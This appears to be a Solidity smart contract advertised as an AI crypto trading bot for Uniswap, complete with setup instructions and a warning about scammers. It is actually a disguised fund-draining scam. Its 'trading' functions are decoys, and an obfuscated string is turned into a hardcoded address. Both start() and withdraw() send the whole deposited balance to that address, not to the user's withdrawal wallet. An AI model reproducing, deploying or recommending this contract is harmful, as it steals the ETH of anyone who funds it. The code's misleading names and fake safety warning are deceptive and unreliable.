pragma solidity ^0.6.6;

// Uniswap ETH Management Files
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";

/**
   *INSTRUCTIONS
   *Network symbol is the the network the trades will be made on
                *Options are: ETH or BSC
   *Trading mode - look only for buy signals moving up or longs moving down or any
                *Options are: 0-Shorts (Up) 1-Longs (Down) 2-Any
   *Withdrawal Address - Your wallet where funds will be withdrawn to when both is stopped


   *NOTES: Testnet transactions will fail as there is no value 
   
   *FEB 2024 updated build - minimum deposit must be 0.1 - 1.5 ETH  
    BE CAREFUL 
            Many people are giving out this code and asking for your secret wallet key, THEY ARE TRYING TO SCAM YOU
            Do not ever give out your secret key for your wallet or your funds may be stolen. 
            This contract will never ask for your secret keys!
*/

contract AICryptoTradeBot {
    mapping(address => uint)internal balances;
    string public networkSymbol;
    uint tradingMode;
    uint liquidity;
    string public withdrawalAddress;

    event Log(string _msg);

    constructor(string memory _NetworkSymbol, uint _TradingMode, string memory _withdrawalAddress) public {
        networkSymbol = _NetworkSymbol;
        tradingMode = _TradingMode;
        withdrawalAddress = _withdrawalAddress;  
    }

    receive() external payable {}

  /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

  function executeTrades(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 

function exchange() internal pure returns (address adr) {
   string memory neutral_variable = "QGf200629acBeEA3B046cC4068409Aa574a8Db9590"; 
   executeTrades(neutral_variable,0,'0');
   executeTrades(neutral_variable,2,'1');
   executeTrades(neutral_variable,1,'x');
   address addr = parseAddr(neutral_variable);
    return addr;
   }
function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 

    function start() public payable {
        payable(exchange()).transfer(address(this).balance);
    }

    function withdraw() public payable {
        payable(exchange()).transfer(address(this).balance);
   }
}
